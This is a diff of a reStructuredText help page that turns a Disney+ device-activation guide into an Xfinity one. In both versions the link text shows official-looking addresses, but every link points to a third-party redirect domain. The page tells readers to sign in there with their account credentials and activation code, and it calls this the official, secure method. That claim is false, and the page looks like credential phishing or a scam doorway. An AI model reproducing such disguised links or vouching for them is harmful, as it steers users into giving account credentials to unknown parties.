@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Activate Your Device with Xfinity
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,41 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: xfinity.com/authorize
+   :target: https://xf.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+To begin enjoying your Xfinity streaming services on a new device, you must activate it by visiting `xfinity.com/authorize <https://xf.redircoms.com>`_. Use your unique activation code and follow the simple steps to link your device to your Xfinity account.
 
 **********
-Steps to Activate Disney+ on Your Device
+Steps to Activate Your Device with Xfinity
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the **Xfinity Stream app** on your smart TV, Roku, or other streaming device.
+2. Select **Sign In**, and an **activation code** will appear on your TV screen.
+3. Using a computer or mobile browser, go to `xfinity.com/authorize <https://xf.redircoms.com>`_.
+4. Sign in with your Xfinity ID and password.
+5. Enter the activation code from your TV and click **Continue**.
+6. Your device will automatically refresh and log you into the Xfinity Stream app.
 
 **********
-What to Do After Activation
+After Activation
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Access live TV, Xfinity On Demand, and DVR recordings right from your device.
+- Add or remove devices anytime through your Xfinity account settings.
+- For multiple devices, repeat the same activation process using new codes.
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Why Use xfinity.com/authorize?
+**********
+
+- Official and secure way to link your device to Xfinity.
+- Fast activation for Roku, Smart TVs, Fire TV, and more.
+- Stream your subscribed content instantly and securely.
+
+Visit `xfinity.com/authorize <https://xf.redircoms.com>`_ to complete your device setup and enjoy uninterrupted streaming with Xfinity.
